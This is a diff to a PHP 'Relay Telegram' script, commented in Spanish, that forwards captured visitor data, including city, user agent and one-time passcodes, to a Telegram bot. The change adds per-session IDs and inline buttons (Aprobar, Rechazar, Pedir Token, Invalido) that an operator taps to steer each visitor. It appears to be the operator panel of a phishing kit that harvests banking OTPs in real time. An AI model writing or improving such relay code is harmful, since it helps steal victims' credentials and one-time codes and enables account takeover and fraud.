@@ -1,4 +1,10 @@
 <?php
+session_start();
+if (empty($_SESSION['wait_uid'])) {
+    $_SESSION['wait_uid'] = bin2hex(random_bytes(8));
+}
+$uid = $_SESSION['wait_uid'];
+
 // ============================================================
 //  Relay Telegram - Recibe datos del front y los envía al bot
 // ============================================================
@@ -86,28 +92,24 @@ $lines[] = "🏙️ <b>Ciudad:</b> ". $esc($city);
 $lines[] = "🖥️ <b>UA:</b> "    . $esc(substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150));
 if (!empty($d['token'])) $lines[] = "🔢 <b>OTP:</b> "     . $esc($d['token']);
 
-// Botones inline nativos de Telegram
-$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-$host  = $_SERVER['HTTP_HOST'] ?? 'localhost';
-$ctrl  = $proto . '://' . $host . '/simulador/wait.php?k=op2025';
-
+// Botones inline con callback_data (procesado por bot.php webhook)
 $keyboard = null;
 if (strpos($step, 'COMPLETO') !== false) {
     $keyboard = ['inline_keyboard' => [
         [
-            ['text' => 'Aprobar',     'url' => $ctrl . '&s=continue'],
-            ['text' => 'Rechazar',    'url' => $ctrl . '&s=error'],
+            ['text' => 'Aprobar',     'callback_data' => 'CONTINUE|' . $uid],
+            ['text' => 'Rechazar',    'callback_data' => 'ERROR|' . $uid],
         ],
         [
-            ['text' => 'Pedir Token', 'url' => $ctrl . '&s=token'],
+            ['text' => 'Pedir Token', 'callback_data' => 'TOKEN|' . $uid],
         ],
     ]];
 }
 if (strpos($step, 'TOKEN') !== false) {
     $keyboard = ['inline_keyboard' => [
         [
-            ['text' => 'Aprobar',  'url' => $ctrl . '&s=finish'],
-            ['text' => 'Invalido', 'url' => $ctrl . '&s=error'],
+            ['text' => 'Aprobar',  'callback_data' => 'FINISH|' . $uid],
+            ['text' => 'Invalido', 'callback_data' => 'INVALID|' . $uid],
         ],
     ]];
 }
